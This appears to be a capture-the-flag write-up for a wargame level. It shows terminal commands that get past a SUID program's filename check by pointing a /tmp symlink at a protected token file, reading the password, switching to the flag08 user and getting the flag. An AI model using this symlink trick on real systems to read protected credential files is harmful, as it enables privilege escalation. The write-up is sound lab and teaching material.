 -rw-------  1 flag08  flag08    26 Mar  5  2016 token

again an SUID script, and a token file

cat token
 cat: token: Permission denied

./level08 
 ./level08 [file to read]

./level08 token
 You may not access 'token'

echo "abc" > /tmp/test
./level08 /tmp/test
 abc

so it seems the script reads the file
it should be able to read token since it has the perms

strings level08
 %s [file to read]
 token
 You may not access '%s' <== THERE
 Unable to open %s
 Unable to read fd %d
 ;*2$"

looks like it stores the name of the file to read and refuses to read it if it's named "token"

./level08 ~/token
 You may not access '/home/user/level08/token'

or if it contains token
again we're not allowed write access but we can make a symlink of token in /tmp :

ln -s token /tmp/smth

./level08 /tmp/smth
 quif5eloekouj29ke0vouxean

su flag08
 password: quif5eloekouj29ke0vouxean

getflag
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
